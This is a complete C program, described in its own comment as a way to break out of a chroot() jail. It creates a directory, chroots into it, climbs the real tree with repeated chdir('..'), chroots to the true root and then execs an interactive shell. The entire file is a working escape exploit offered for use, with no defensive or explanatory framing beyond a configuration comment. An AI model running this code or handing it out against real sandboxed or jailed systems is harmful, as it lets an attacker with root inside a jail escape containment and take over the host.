#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>

/* 
 ** You should set NEED_FCHDIR to 1 if the chroot() on your
 ** system changes the working directory of the calling
 ** process to the same directory as the process was chroot()ed
 ** to.
 **
 ** It is known that you do not need to set this value if you
 ** running on Solaris 2.7 and below.
 **
 */
#define NEED_FCHDIR 0

#define TEMP_DIR "waterbuffalo"

/* Break out of a chroot() environment in C */

int main() {
	int x;					  /* Used to move up a directory tree */
	int done=0;				  /* Are we done yet ? */
#ifdef NEED_FCHDIR
	int dir_fd;				  /* File descriptor to directory */
#endif
	struct stat sbuf;			  /* The stat() buffer */

	/* 
	 ** First we create the temporary directory if it doesn't exist
	 */
	if (stat(TEMP_DIR,&sbuf)<0) {
		if (errno==ENOENT) {
			if (mkdir(TEMP_DIR,0755)<0) {
				fprintf(stderr,"Failed to create %s - %s\n", TEMP_DIR,
					strerror(errno));
				exit(1);
			}
		}
		else {
			fprintf(stderr,"Failed to stat %s - %s\n", TEMP_DIR,
				strerror(errno));
			exit(1);
		}
	}
	else if (!S_ISDIR(sbuf.st_mode)) {
		fprintf(stderr,"Error - %s is not a directory!\n",TEMP_DIR);
		exit(1);
	}

#ifdef NEED_FCHDIR
	/* 
	 ** Now we open the current working directory
	 **
	 ** Note: Only required if chroot() changes the calling program's
	 **       working directory to the directory given to chroot().
	 **
	 */
	if ((dir_fd=open(".",O_RDONLY))<0) {
		fprintf(stderr,"Failed to open \".\" for reading - %s\n",
			strerror(errno));
		exit(1);
	}
#endif

	/* 
	 ** Next we chroot() to the temporary directory
	 */
	if (chroot(TEMP_DIR)<0) {
		fprintf(stderr,"Failed to chroot to %s - %s\n",TEMP_DIR,
			strerror(errno));
		exit(1);
	}

#ifdef NEED_FCHDIR
	/* 
	 ** Partially break out of the chroot by doing an fchdir()
	 **
	 ** This only partially breaks out of the chroot() since whilst
	 ** our current working directory is outside of the chroot() jail,
	 ** our root directory is still within it. Thus anything which refers
	 ** to "/" will refer to files under the chroot() point.
	 **
	 ** Note: Only required if chroot() changes the calling program's
	 **       working directory to the directory given to chroot().
	 **
	 */
	if (fchdir(dir_fd)<0) {
		fprintf(stderr,"Failed to fchdir - %s\n",
			strerror(errno));
		exit(1);
	}
	close(dir_fd);
#endif

	/* 
	 ** Completely break out of the chroot by recursing up the directory
	 ** tree and doing a chroot to the current working directory (which will
	 ** be the real "/" at that point). We just do a chdir("..") lots of
	 ** times (1024 times for luck :). If we hit the real root directory before
	 ** we have finished the loop below it doesn't matter as .. in the root
	 ** directory is the same as . in the root.
	 **
	 ** We do the final break out by doing a chroot(".") which sets the root
	 ** directory to the current working directory - at this point the real
	 ** root directory.
	 */
	for(x=0;x<1024;x++) {
		chdir("..");
	}
	chroot(".");

	/* 
	 ** We're finally out - so exec a shell in interactive mode
	 */
	if (execl("/bin/sh","-i",NULL)<0) {
		fprintf(stderr,"Failed to exec - %s\n",strerror(errno));
		exit(1);
	}
}
